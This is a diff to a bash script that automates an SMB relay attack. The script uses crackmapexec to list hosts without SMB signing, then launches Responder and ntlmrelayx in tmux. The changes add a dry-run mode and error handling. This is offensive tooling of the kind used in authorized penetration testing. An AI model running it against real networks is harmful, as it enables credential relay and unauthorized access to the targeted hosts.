@@ -12,6 +12,7 @@ window1="responder"
 window2="ntlmrelayx"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 enable_interactive=false
+dry_run=false
 
 # Define color codes
 RED='\033[0;31m'
@@ -30,6 +31,7 @@ print_help() {
     echo -e "  ${YELLOW}-f TARGET_FILE${RESET}   (Required) File containing target IPs to scan for misconfigured SMB signing."
     echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET} (Optional) Specify network interface (default: ${network_interface})."
     echo -e "  ${YELLOW}-x${RESET}               (Optional) Enable interactive shell in ntlmrelayx."
+    echo -e "  ${YELLOW}-d${RESET}               (Optional) Dry-run mode. Scan and show results but do not launch attack."
     echo -e "  ${YELLOW}-h${RESET}               Display this help and exit."
 }
 
@@ -72,8 +74,11 @@ run_crackmapexec() {
     echo -e "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
     
     # Run crackmapexec and let it generate the relay list
-    crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}"
-
+    crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}" || {
+        echo -e "${RED}[!] crackmapexec failed. Exiting.${RESET}"
+        exit 1
+    }
+    
     # Optional: show which targets were found
     if [ -s "${TARGET_SMB_FILE}" ]; then
         echo -e "${YELLOW}[+] Misconfigured SMB signing detected on the following targets:${RESET}"
@@ -150,22 +155,14 @@ run_smb_relay_attack() {
     tmux -CC attach-session -t "$session_name"
 }
 
-while getopts "f:hi:x" opt; do
+while getopts "f:hi:xd" opt; do
     case $opt in
-    f)
-        TARGET_FILE="$OPTARG"
-        ;;
-    h)
-        print_help
-        exit 0
-        ;;
-    i)
-        network_interface="$OPTARG"
-        ;;
-    x)
-        enable_interactive=true
-        ;;
-    \?)
+    f) TARGET_FILE="$OPTARG";;
+    h) print_help; exit 0 ;;
+    i) network_interface="$OPTARG";;
+    x) enable_interactive=true ;;
+    d) dry_run=true ;;
+    \?) 
         echo -e "${RED}[!] Invalid option: -$OPTARG${RESET}" >&2
         print_help
         exit 1
@@ -207,7 +204,6 @@ if tmux has-session -t "$session_name" 2>/dev/null; then
 fi
 
 # Check required arguments
-# Check required arguments
 if [ -z "${TARGET_FILE}" ]; then
     echo -e "${RED}[!] Missing required argument: -f TARGET_FILE${RESET}"
     print_help
@@ -224,9 +220,16 @@ check_tool "crackmapexec"
 run_crackmapexec
 
 if [ -s "${TARGET_SMB_FILE}" ]; then
-    edit_responder_conf
-    sleep 2
-    run_smb_relay_attack
+    if [ "$dry_run" = true ]; then
+        echo -e "${YELLOW}[!] Dry-run mode enabled. No attack will be launched.${RESET}"
+        echo -e "${GREEN}[+] Vulnerable targets saved in ${TARGET_SMB_FILE}.${RESET}"
+        exit 0
+    else
+        edit_responder_conf
+        sleep 2
+        run_smb_relay_attack
+    fi
 else
-    echo -e "${RED}[!] There are no misconfigured smb signing targets found. Exiting...${RESET}"
+    echo -e "${RED}[!] There are no misconfigured SMB signing targets found. Exiting...${RESET}"
+    exit 1
 fi
